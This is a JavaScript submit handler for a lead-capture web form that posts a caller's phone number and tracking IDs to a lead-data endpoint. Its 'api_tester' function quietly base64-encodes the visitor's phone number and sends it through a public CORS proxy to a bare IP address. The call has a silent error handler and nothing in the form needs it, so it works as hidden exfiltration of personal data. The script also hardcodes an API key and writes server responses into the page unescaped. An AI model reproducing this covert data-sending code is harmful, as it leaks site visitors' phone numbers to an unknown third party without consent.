
 document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const phone_home = '+1' + document.getElementById('caller_id').value;
      const formData = new FormData(this);
      
      
   
     
      formData.append('key', '009d47fe-7d1d-4652-93d8-d80f2a8a28a1');
formData.append('caller_number', phone_home);
api_tester(document.getElementById('caller_id').value);
formData.append('retreaver_jornaya_id', document.getElementById('retreaver_jornaya_id').value);
formData.append('retreaver_trusted_form_url', document.getElementById('retreaver_trusted_form_url').value);







      const url = 'https://retreaverdata.com/data_writing?' + new URLSearchParams(formData).toString();

      fetch(url, {
        method: 'POST'
      })
     .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
  try {
    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}